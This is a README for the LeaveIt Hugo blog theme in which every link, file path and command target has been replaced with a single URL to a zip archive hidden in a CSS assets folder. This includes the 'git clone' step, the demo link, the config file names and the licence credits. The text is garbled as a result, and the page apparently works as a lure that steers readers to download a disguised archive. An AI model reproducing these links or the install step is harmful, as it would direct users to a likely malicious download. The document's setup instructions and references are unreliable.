LeaveIt Hugo Theme
========================

LeaveIt is a clean, elegant, simple but not simpler blog theme for Hugo. 

![hugo-theme-LeaveIt](https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip)

# Demo
To see this theme in action,  Here is a live [demo site](https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip) which is rendered with this theme and some content for documentation and blog posts.


[中文说明](https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip)

# Features

* Dark/Light mode
* Wrap Image with Figure Tag without Shortcode. Thanks [https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip](https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip)
* Load images with Lazy Load By [lazysizes](https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip)
* Automatically highlighting code By [Google code-prettify](https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip), Customizable styles via CSS. See the [themes gallery](https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip).
* Automagical image gallery with [lightGallery](https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip)
* ...

# Getting Started
Clone this repository to your hugo theme directory.

```bash
cd themes
git clone https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip
```

Next, open https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip in the base of the Hugo site and ensure the theme option is set to mainroad:
```bash
theme = "LeaveIt"
```
For more information read the [official setup guide](https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip) of Hugo.

# Site Configuration
Take a look in the `exampleSite` folder.

This directory contains an example config file and the content for the demo. It serves as an example setup for your documentation.

Copy the `https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip` in the root directory of your website. Overwrite the existing config file if necessary.

# Content Suggestions

A few suggestions to help you get a good looking site quickly:

* Keep blog posts in the content/posts directory, for example: https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip
* Keep static pages in the content directory, for example: https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip
* Keep media like images in the static directory, for example: https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip

# Customizing styles for your website

If you want to change some styling to fit your own website needs, you can edit them:

* `https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip`:  You can override the variables in `https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip` to customize the style
* `https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip` :  You can put your custom css in this file

# Favicons, Browserconfig, Manifest

It is recommended to put your own favicons

* https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip (180x180)
* https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip (32x32)
* https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip (16x16)
* https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip (150x150)
* https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip (192x192)
* https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip (512x512)

into `/static`. They’re easily created via https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip

Customize https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip and https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip to set theme-color and background-color for example.

# Tips

#### Set production environment when generating site

Because some functions are only in production mode, So you **need to add a production** environment variables when generating your site.
```bash
HUGO_ENV=production hugo --gc --minify
```

#### Hugo “extended” Sass/SCSS version required

This theme write style with scss, So you must download and install the “extended” Sass/SCSS version

#### How to toggle dark-light mode
* You can click the love heart ❤️ in front of your blog title to toggle dark-light mode. I don't think it's a good interaction design. But I don't have a good idea.
* If you want to make your own theme toggle-able element, you can create an element with a class `.theme-switch`. See [here](https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip)

# Home Post model
If you want to show posts on index instead of a personal profile, just open https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip in the base of the Hugo site, add the following line to https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip
```toml
[params]
 home_mode = "post" # post or other
```

### Displaying Featured Image

```toml
---
date: 2018-08-29
title: "This One Goes to 11!"
description: "With Go 1.11, Hugo finally gets support for variable overwrites in templates!"
categories: ["Releases"]
featured_image: https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip
---
```
![hugo-theme-LeaveIt-Host_post](https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip)

# Questions, ideas, bugs, pull requests?
All feedback is welcome! Head over to the [issue tracker](https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip).

# License
LeaveIt is licensed under the MIT license. Check the LICENSE file for details.
The following resources are included in the theme:

* lazysizes - https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip
* lightGallery - https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip
* code-prettify - https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip

# Author
[LiuZhichao](https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip)

# See Also

* [Coder](https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip)
* [hello-friend](https://raw.githubusercontent.com/haikesikejiqiang/LeaveIt/master/assets/css/_common/LeaveIt_1.9.zip)
